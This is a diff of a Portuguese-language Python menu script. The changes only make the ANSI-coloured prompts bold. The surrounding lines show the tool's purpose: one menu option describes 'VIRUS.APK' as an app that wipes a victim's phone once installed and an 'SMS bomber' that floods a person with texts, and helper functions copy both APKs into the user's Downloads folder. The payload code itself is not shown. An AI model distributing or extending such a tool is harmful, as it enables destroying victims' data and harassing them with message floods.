@@ -209,7 +209,7 @@ while MENU_BW != "12":
                print ('''\033[1;34m
 O APK VIRUS.APK é um app que quando a vítima instala o mesmo vai apagar tudo do celular dela, e o app sms bomber seve pra enviar vários sms pra pessoa.
                     \033[0m  ''')
-               OP_PAUSAR = input('\033[33mAPERTE ENTER PARA OBTER OS APKS:\033[0m')
+               OP_PAUSAR = input('\033[1;33mAPERTE ENTER PARA OBTER OS APKS:\033[0m')
                copiar_app_virusapk() #cuidado com esse apk, ele serve pra formatar o cell
                copiar_app_smsbomber() #Cuidado com esse tbm, eu baixei na internet, não sei se tem vírus
 
@@ -218,7 +218,7 @@ O APK VIRUS.APK é um app que quando a vítima instala o mesmo vai apagar tudo d
                clear()
                print ('''\033[1;31mPRONTO, AGORA VERIFIQUE A SUA PASTA DE DOWNLOADS.\033[0m:
                       ''')
-               OP_PAUSAR = input('\033[33mAPERTE ENTER PARA VOLTAR AO MENU ANTERIOR:\033[0m')
+               OP_PAUSAR = input('\033[1;33mAPERTE ENTER PARA VOLTAR AO MENU ANTERIOR:\033[0m')
           case "6":
                iniciar_helewings()
 
@@ -287,7 +287,7 @@ Também vale destacar que o script tá todo automatizado, Ou seja. Após o usuá
 \033[0m\033[1;31m
 Ass: \033[0m\033[1;34mGabriel Kelzer\033[0m
 ''')
-               OP_PAUSAR = input('\033[33mAPERTE ENTER PARA VOLTAR AO MENU ANTERIOR:\033[0m')
+               OP_PAUSAR = input('\033[1;33mAPERTE ENTER PARA VOLTAR AO MENU ANTERIOR:\033[0m')
           case "12":
                
                print('''
